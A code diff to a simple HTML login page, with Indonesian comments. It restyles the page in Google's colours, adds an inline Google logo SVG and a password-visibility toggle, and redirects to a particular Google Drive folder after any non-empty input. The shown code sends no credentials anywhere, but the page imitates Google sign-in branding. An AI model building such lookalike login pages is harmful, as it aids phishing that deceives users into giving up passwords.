@@ -12,53 +12,81 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f0f0f0;
-            transition: background-color 0.5s ease; /* Transisi background jika diperlukan */
+            background: linear-gradient(135deg, #e3f2fd, #bbdefb); /* Gradien biru muda */
+            transition: background-color 0.5s ease;
         }
         .login-container {
             background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            width: 300px;
-            transition: opacity 0.5s ease, transform 0.5s ease; /* Efek fade-out dan scale */
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            width: 320px;
+            transition: opacity 0.5s ease, transform 0.5s ease;
+            border: 1px solid #e1f5fe; /* Border biru muda */
         }
         .login-container.hidden {
             opacity: 0;
-            transform: scale(0.9); /* Menyusut sedikit saat menghilang */
+            transform: scale(0.9);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo svg {
+            width: 120px;
+            height: auto;
         }
         input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 10px;
+            width: calc(100% - 40px); /* Ruang untuk ikon */
+            padding: 12px;
             margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            transition: border-color 0.3s ease; /* Efek pada input */
+            border: none;
+            border-bottom: 2px solid #90caf9; /* Garis bawah biru */
+            border-radius: 0;
+            background: transparent;
+            transition: border-color 0.3s ease;
+            font-size: 16px;
         }
         input:focus {
-            border-color: #4CAF50;
+            border-bottom-color: #1976d2; /* Biru gelap saat fokus */
+            outline: none;
+        }
+        .input-container {
+            position: relative;
+        }
+        .input-container .eye-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #90caf9;
+            font-size: 18px;
         }
         button {
             width: 100%;
-            padding: 10px;
-            background-color: #4CAF50;
+            padding: 12px;
+            background: linear-gradient(135deg, #1976d2, #42a5f5); /* Gradien biru */
             color: white;
             border: none;
-            border-radius: 4px;
+            border-radius: 6px;
             cursor: pointer;
-            transition: background-color 0.3s ease, transform 0.2s ease; /* Efek hover dan klik */
+            font-size: 16px;
+            transition: background 0.3s ease, transform 0.2s ease;
+            margin-top: 20px;
         }
         button:hover {
-            background-color: #45a049;
-            transform: translateY(-2px); /* Sedikit naik saat hover */
+            background: linear-gradient(135deg, #1565c0, #1e88e5);
+            transform: translateY(-2px);
         }
         button:active {
-            transform: translateY(0); /* Kembali normal saat klik */
+            transform: translateY(0);
         }
         #message {
             margin-top: 10px;
-            color: red;
-            transition: color 0.3s ease; /* Transisi warna pesan */
+            color: #d32f2f; /* Merah untuk error */
+            transition: color 0.3s ease;
+            text-align: center;
         }
         .loading {
             display: none;
@@ -66,30 +94,49 @@
             margin-top: 20px;
         }
         .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #4CAF50;
+            border: 4px solid #e3f2fd;
+            border-top: 4px solid #1976d2;
             border-radius: 50%;
             width: 40px;
             height: 40px;
-            animation: spin 1s linear infinite; /* Animasi rotasi */
+            animation: spin 1s linear infinite;
             margin: 0 auto;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .decorative-line {
+            height: 2px;
+            background: linear-gradient(90deg, #e3f2fd, #1976d2, #e3f2fd);
+            margin: 20px 0;
+        }
     </style>
 </head>
 <body>
     <div class="login-container" id="loginContainer">
-        <h2>Login</h2>
+        <div class="logo">
+            <!-- Logo Google SVG sederhana -->
+            <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+                <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18S81.24 25 93.5 25s22.25 9.41 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18 86.78 60.62 93.5 60.62s12.51-5.44 12.51-13.44z" fill="#EA4335"/>
+                <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18S129.24 25 141.5 25s22.25 9.41 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44 5.79 13.44 12.51 13.44 12.51-5.44 12.51-13.44z" fill="#FBBC05"/>
+                <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09s10.16-22.26 21.25-22.26c5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#34A853"/>
+                <path d="M225 3v65h-9.5V3h9.5z" fill="#EA4335"/>
+                <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
+                <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
+            </svg>
+        </div>
+        <div class="decorative-line"></div>
         <form id="loginForm">
-            <label for="username">Username:</label>
-            <input type="text" id="username" name="username" required>
-            
-            <label for="password">Password:</label>
-            <input type="password" id="password" name="password" required>
-            
+            <div class="input-container">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="input-container">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+                <span class="eye-icon" id="togglePassword">👁️</span>
+            </div>
             <button type="submit">Login</button>
         </form>
         <div id="message"></div>
@@ -100,28 +147,33 @@
     </div>
 
     <script>
+        // Toggle password visibility
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const passwordField = document.getElementById('password');
+            const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordField.setAttribute('type', type);
+            this.textContent = type === 'password' ? '👁️' : '🙈'; // Ganti ikon
+        });
+
         document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Mencegah form submit ke server
+            event.preventDefault();
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
-            // Simulasi validasi sederhana (ganti dengan logika backend jika diperlukan)
             if (username && password) {
                 document.getElementById('message').innerText = `Login berhasil!`;
-                document.getElementById('message').style.color = 'green';
+                document.getElementById('message').style.color = '#1976d2'; // Biru untuk sukses
                 
-                // Mulai efek transisi: sembunyikan container dan tampilkan loading
                 const container = document.getElementById('loginContainer');
                 const loading = document.getElementById('loading');
-                container.classList.add('hidden'); // Fade-out dan scale
+                container.classList.add('hidden');
                 setTimeout(() => {
-                    loading.style.display = 'block'; // Tampilkan loading setelah fade-out
-                }, 500); // Tunggu fade-out selesai
+                    loading.style.display = 'block';
+                }, 500);
                 
-                // Redirect ke Google Drive setelah 2 detik (total delay untuk efek)
                 setTimeout(function() {
-                    window.location.href = 'https://drive.google.com/';
+                    window.location.href = 'https://drive.google.com/drive/folders/1hDdAySCY-x2QGPSFd-eNSAfO__jNjrWM';
                 }, 2000);
             } else {
                 document.getElementById('message').innerText = 'Harap isi semua field.';
